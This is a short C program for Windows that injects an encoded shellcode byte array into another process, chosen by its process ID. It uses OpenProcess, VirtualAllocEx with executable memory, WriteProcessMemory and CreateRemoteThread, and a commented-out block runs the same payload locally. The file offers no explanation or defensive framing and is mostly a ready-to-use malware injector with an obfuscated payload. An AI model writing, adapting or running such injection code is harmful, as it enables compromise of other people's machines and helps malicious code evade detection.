#include "windows.h"
#define SCSIZE 500

int main(int argc, char *argv[]){
unsigned char fub[SCSIZE] = 
"\x6a\x57\x59\xd9\xee\xd9\x74\x24\xf4\x5b\x81\x73\x13\xf6\xad"
"\xb0\xc0\x83\xeb\xfc\xe2\xf4\x9c\xfc\xe9\x19\x18\x74\xc4\xe4"
"\x02\xf6\x31\xb3\xe5\xa9\x05\x52\x05\x2e\x5b\x3c\x14\x59\x48"
"\x9d\xe6\x5e\xb4\x75\x04\xd7\x51\x44\xa4\x3a\x3f\x25\x54\xd5"
"\xe6\x79\xef\x0c\xa0\xfe\x16\x76\xbb\xc2\x2e\x78\x85\x8a\xc8"
"\x62\xd5\x09\x66\x72\x94\xb4\xab\x53\xb5\xb2\x86\xac\xe6\x22"
"\xef\x0c\xa4\xfe\x2e\x62\x3f\x39\x75\x26\x57\x3d\x65\x8f\xe5"
"\xfe\x3d\x7e\xb5\xa6\xef\x17\xac\x96\x5e\x17\x3f\x41\xef\x5f"
"\x62\x44\x9b\xf2\x75\xba\x69\x5f\x73\x4d\x84\x2b\x42\x76\x19"
"\xa6\x8f\x08\x40\x2b\x50\x2d\xef\x06\x90\x74\xb7\x38\x3f\x79"
"\x2f\xd5\xec\x69\x65\x8d\x3f\x71\xef\x5f\x64\xfc\x20\x7a\x90"
"\x2e\x3f\x3f\xed\x2f\x35\xa1\x54\x2a\x3b\x04\x3f\x67\x8f\xd3"
"\xe9\x1d\x57\x6c\xb4\x75\x0c\x29\xc7\x47\x3b\x0a\xdc\x39\x13"
"\x78\xb3\x8a\xb1\xe6\x24\x74\x64\x5e\x9d\xb1\x30\x0e\xdc\x5c"
"\xe4\x35\xb4\x8a\xb1\x0e\xe4\x25\x34\x1e\xe4\x35\x34\x36\x5e"
"\x7a\xbb\xbe\x4b\xa0\xf3\x34\xb1\x1d\xa4\xf6\x8c\x12\x0c\x5c"
"\xb4\x6a\xf4\xd7\x52\x1f\x74\x08\xe3\x1d\xfd\xfb\xc0\x14\x9b"
"\x8b\x31\xb5\x10\x52\x4b\x3b\x6c\x2b\x58\x1d\x94\xeb\x16\x23"
"\x9b\x8b\xdc\x16\x09\x3a\xb4\xfc\x87\x09\xe3\x22\x55\xa8\xde"
"\x67\x3d\x08\x56\x88\x02\x99\xf0\x51\x58\x5f\xb5\xf8\x20\x7a"
"\xa4\xb3\x64\x1a\xe0\x25\x32\x08\xe2\x33\x32\x10\xe2\x23\x37"
"\x08\xdc\x0c\xa8\x61\x32\x8a\xb1\xd7\x54\x3b\x32\x18\x4b\x45"
"\x0c\x56\x33\x68\x04\xa1\x61\xce\x94\xeb\x16\x23\x0c\xf8\x21"
"\xc8\xf9\xa1\x61\x49\x62\x22\xbe\xf5\x9f\xbe\xc1\x70\xdf\x19"
"\xa7\x07\x0b\x34\xb4\x26\x9b\x8b\xb0\xc0";

unsigned char comment[100] = "pppppppaaaaaaaaayyyyyyloaaaaaaaaddddddd";


HANDLE processHandle;
HANDLE remoteThread;
PVOID remoteBuffer;

processHandle = OpenProcess(PROCESS_ALL_ACCESS, FALSE, atoi(argv[1]));
remoteBuffer = VirtualAllocEx(processHandle, NULL, sizeof fub, MEM_COMMIT, PAGE_EXECUTE_READWRITE);
WriteProcessMemory(processHandle, remoteBuffer, fub, sizeof fub, NULL);
remoteThread = CreateRemoteThread(processHandle, NULL, 0, (LPTHREAD_START_ROUTINE)remoteBuffer, NULL, 0, NULL);
CloseHandle(processHandle);

/*void *exec = VirtualAlloc(0, sizeof fub, (MEM_COMMIT | MEM_RESERVE), PAGE_EXECUTE_READWRITE);
memcpy(exec, fub, sizeof fub);
((void(*)())exec)();
*/
return (0);
}